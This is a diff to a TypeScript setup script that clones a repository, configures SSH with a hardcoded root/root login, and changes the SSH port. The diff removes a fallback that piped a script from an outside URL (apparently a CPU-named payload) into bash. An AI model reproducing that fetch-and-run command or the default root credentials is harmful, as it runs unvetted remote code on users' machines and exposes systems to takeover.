@@ -19,10 +19,9 @@ const URLS: string[] = [
 const TMP = 'freeroot_temp';
 const DIR = 'work';
 const SH = 'noninteractive.sh';
-const FALLBACK_URL = 'r.snd.qzz.io/raw/cpu';
 
 let sshIp = '0.0.0.0';
-let sshPort = 24990;
+let sshPort = 25565;
 const users = new Map<string, string>([['root', 'root']]);
 
 function log(level: string, msg: string): void {
@@ -97,22 +96,6 @@ async function cloneRepo(): Promise<boolean> {
         }
     }
     return false;
-}
-
-async function fallback(): Promise<boolean> {
-    if (!(await checkCommand('curl'))) {
-        log('WARN', 'Curl not found, cannot use fallback');
-        return false;
-    }
-    log('INFO', `Executing fallback: curl ${FALLBACK_URL} | bash`);
-    try {
-        await execAsync(`curl ${FALLBACK_URL} | bash`);
-        log('INFO', 'Fallback executed successfully');
-        return true;
-    } catch (e: any) {
-        log('ERROR', `Fallback failed: ${e.message}`);
-        return false;
-    }
 }
 
 async function executeScript(dir: string, script: string): Promise<number> {
@@ -391,16 +374,8 @@ async function main(): Promise<void> {
     }
 
     if (!(await cloneRepo())) {
-        log('WARN', 'All clone attempts failed, trying fallback method...');
-        if (existsSync(tmpDir)) {
-            await deleteRecursive(tmpDir);
-        }
-        if (!(await fallback())) {
-            log('ERROR', 'Fallback method also failed');
-            process.exit(1);
-        }
-        log('INFO', 'Fallback method succeeded');
-        return;
+        log('ERROR', 'All clone attempts failed');
+        process.exit(1);
     }
 
     renameSync(tmpDir, workDir);
